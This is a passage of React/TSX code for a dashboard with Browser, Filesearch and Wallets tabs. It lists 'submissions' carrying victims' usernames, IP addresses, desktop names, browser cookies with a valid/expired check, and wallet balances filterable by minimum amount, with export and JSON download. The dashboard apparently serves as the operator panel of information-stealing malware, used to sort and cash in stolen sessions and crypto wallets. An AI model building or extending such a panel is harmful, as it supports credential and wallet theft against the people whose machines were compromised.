            <TabsTrigger
              value="overview"
              className="flex-shrink-0 px-4 py-2 font-medium data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-sm hover:bg-muted-foreground/10 transition-colors"
            >
              📊 Overview
            </TabsTrigger>
            <TabsTrigger
              value="browser"
              className="flex-shrink-0 px-4 py-2 font-medium data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-sm hover:bg-muted-foreground/10 transition-colors"
            >
              🌍 Browser
            </TabsTrigger>
            <TabsTrigger
              value="filesearch"
              className="flex-shrink-0 px-4 py-2 font-medium data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-sm hover:bg-muted-foreground/10 transition-colors"
            >
              📁 Filesearch
            </TabsTrigger>
            <TabsTrigger
              value="wallets"
              className="flex-shrink-0 px-4 py-2 font-medium data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-sm hover:bg-muted-foreground/10 transition-colors"
            >
              💰 Wallets
            </TabsTrigger>
          </TabsList>
        </div>

        <TabsContent value="overview" className="flex flex-col gap-6">
          <StatsOverview />
        </TabsContent>

        <TabsContent value="browser">
          <BrowserSubmissionsTab
            filters={browserFilters}
            onFilterChange={(partial) => setBrowserFilters((prev) => ({ ...prev, ...partial }))}
            onApply={() => loadBrowserSubmissions(1)}
            onClear={clearBrowserFilters}
            onExport={(format) => exportData('browser', format)}
            submissions={browserSubmissions}
            loading={loading}
            page={browserPage}
            totalPages={browserTotalPages}
            onPageChange={(p) => loadBrowserSubmissions(p)}
            formatDate={formatDate}
            onView={(submission) => {
              setSelectedBrowserSubmission(submission);
              setShowBrowserModal(true);
            }}
          />
        </TabsContent>

        <TabsContent value="filesearch">
          <FilesearchSubmissionsTabEnhanced
            submissions={filesearchSubmissions}
            loading={loading}
            filters={filesearchFilters}
            onFilterChange={(p) => setFilesearchFilters((prev) => ({ ...prev, ...p }))}
            onApply={() => loadFilesearchSubmissions()}
            onClear={() => {
              setFilesearchFilters({ minBalance: '', username: '' });
              loadFilesearchSubmissions();
            }}
            onExport={(format) => exportData('filesearch', format)}
            formatDate={formatDate}
            formatBalance={formatBalance}
          />
        </TabsContent>

        <TabsContent value="wallets">
          <WalletSubmissionsTabEnhanced
            submissions={walletSubmissions}
            loading={loading}
            filters={walletFilters}
            onFilterChange={(p) => setWalletFilters((prev) => ({ ...prev, ...p }))}
            onApply={() => loadWalletSubmissions()}
            onClear={() => {
              setWalletFilters({ minBalance: '', username: '' });
              loadWalletSubmissions();
            }}
            onExport={(format) => exportData('wallets', format)}
            formatDate={formatDate}
            formatBalance={formatBalance}
          />
        </TabsContent>
      </Tabs>

      {showBrowserModal && selectedBrowserSubmission && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
          role="dialog"
          aria-modal="true"
        >
          <div className="bg-card border rounded-lg shadow-xl w-full max-w-2xl max-h-[85vh] flex flex-col">
            <div className="p-4 border-b flex items-center justify-between">
              <h2 className="text-lg font-semibold flex items-center gap-2">
                <Globe className="h-4 w-4" /> Browser Submission Details
              </h2>
              <Button variant="ghost" size="sm" onClick={() => setShowBrowserModal(false)}>
                Close
              </Button>
            </div>
            <div className="p-4 overflow-auto flex flex-col gap-4 text-sm">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <div className="font-medium">ID</div>
                  <div className="text-muted-foreground break-all">
                    {selectedBrowserSubmission.id}
                  </div>
                </div>
                <div>
                  <div className="font-medium">User</div>
                  <div className="text-muted-foreground">
                    {selectedBrowserSubmission.username} (ID {selectedBrowserSubmission.user_id})
                  </div>
                </div>
                <div>
                  <div className="font-medium">Browser</div>
                  <div className="text-muted-foreground">{selectedBrowserSubmission.browser}</div>
                </div>
                <div>
                  <div className="font-medium">Type</div>
                  <div>
                    <Badge variant="secondary">{selectedBrowserSubmission.type}</Badge>
                  </div>
                </div>
                <div>
                  <div className="font-medium">IP Address</div>
                  <div className="text-muted-foreground">
                    {selectedBrowserSubmission.ip_address}
                  </div>
                </div>
                <div>
                  <div className="font-medium">Desktop Name</div>
                  <div className="text-muted-foreground">
                    {selectedBrowserSubmission.desktop_name || 'N/A'}
                  </div>
                </div>
                <div>
                  <div className="font-medium">Created</div>
                  <div className="text-muted-foreground">
                    {formatDate(selectedBrowserSubmission.created_at)}
                  </div>
                </div>
                {selectedBrowserSubmission.type === 'cookies' && cookieStatus && (
                  <div className="col-span-2">
                    <div className="font-medium mb-1">Cookie Status</div>
                    <div className="flex items-center gap-3 flex-wrap">
                      <Badge
                        variant={cookieStatus.expired ? 'destructive' : 'secondary'}
                        className={
                          cookieStatus.expired
                            ? 'bg-destructive text-destructive-foreground'
                            : 'bg-success/15 text-success'
                        }
                      >
                        {cookieStatus.expired ? 'Expired' : 'Valid'}
                      </Badge>
                      {cookieStatus.session ? (
                        <span className="text-xs text-muted-foreground">Session cookie</span>
                      ) : cookieStatus.expiryDate ? (
                        <span className="text-xs text-muted-foreground">
                          Expires: {cookieStatus.expiryDate}
                        </span>
                      ) : null}
                    </div>
                  </div>
                )}
              </div>
              <div>
                <div className="font-medium mb-2 flex items-center gap-2">
                  <Database className="h-4 w-4" /> Raw Data
                </div>
                <pre className="bg-muted rounded p-3 text-xs overflow-auto max-h-64 whitespace-pre-wrap break-all">
                  {JSON.stringify(selectedBrowserSubmission.data, null, 2)}
                </pre>
              </div>
              <div className="flex justify-end gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => {
                    try {
                      const blob = new Blob([JSON.stringify(selectedBrowserSubmission, null, 2)], {
                        type: 'application/json',
                      });
                      const url = URL.createObjectURL(blob);
                      const a = document.createElement('a');
                      a.href = url;
                      a.download = `browser-submission-${selectedBrowserSubmission.id}.json`;
                      document.body.appendChild(a);
                      a.click();
                      document.body.removeChild(a);
                      URL.revokeObjectURL(url);
                    } catch (e) {
                      toast.error('Failed to export JSON');
                    }
                  }}
                >
                  Download JSON
                </Button>
                <Button size="sm" onClick={() => setShowBrowserModal(false)}>
                  Close
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
